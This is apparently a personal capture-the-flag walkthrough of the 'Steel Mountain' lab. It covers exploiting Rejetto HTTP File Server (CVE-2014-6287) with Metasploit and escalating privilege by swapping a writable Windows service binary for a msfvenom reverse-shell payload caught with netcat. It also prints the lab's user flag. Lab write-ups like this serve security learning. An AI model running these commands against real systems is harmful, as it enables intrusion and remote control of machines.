# Steel Mountain

## 1 - Introduction
Kicked off my nmaps here
### Who is employee of the month? 
Visiting the site shows us an image, viewing image src shows filename BillHarper.png - ez
hint suggests using reverse image search but wasn't necessary.

## 2 - Initial Access 
### What is the other port running a web server on?
Scan shows 8080 running http server
### What file server is running? (on the other web server)
http file server is clear, link shows rejetto - rejetto http file server
### What is the CVE number to exploit this file server?
searching in exploit-db, chose the metasploit link, we see 2014-6287, a remote command execution vulnerability
### Use metasploit to get an initial shell. What is the user flag?
`msfconsole`
`search rejetto` -  1 result, so
`use 0`
`show options` - we need to set RHOSTS and RPORT 
`set RHOSTS {machine ip}`
`set RPORT 8080`
`exploit` - gets us a meterpreter which we can turn into a powershell with `shell`. These bits are always showing me that I know very little Powershell.
Found the file (mainly luckily - could do with learnign the equivalent to `find` on psh.) the desktop. `type user.txt` gives us the flag: b04763b6fcf51fcd7c13abc7db4fd365

We have our user access, next up:
## 3 - Privilege escalation
Description for this one is prety much a walkthrough, used the powersploit privesc powerup to find a service which we can both:
- write to
- restart
This means we can replace the service with our payload, a reverse shell.
using msfvenom we generate a new payload (will admit i just copied th example here instead of reading up on msfvenom again)
`msfvenom -p windows/shell_reverse_tcp LHOST={my eth0 ip} LPORT=4443 -e x86/shikata_ga_nai -f exe -o Advanced.exe`

using our meterpreter session, `upload {path to payload}` puts out payload on the target machine
`load powershell` gives us a psh extension so we can use some cmdlets
`powershell_shell` gets us into a powershell session.
`Stop-Service AdvancedSystemCareService9` - stops the service so we don't get an 'in-use' error when overwriting
`Copy-Item -Path {payload path} -Destination {dest path - 'C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe'} -Force`
now our payload has replaced the service, on the attacker machine we need to listen for the reverse shell.
`nc -lvp 4443' (port we set in the venom command) listens
back in the powershell session, we want to start the service again - `Start-Service AdvancedSystemCareService9`
This should give us a root session in our netcat listener! we're in

## 4 - Access and Escalation without Metasploit
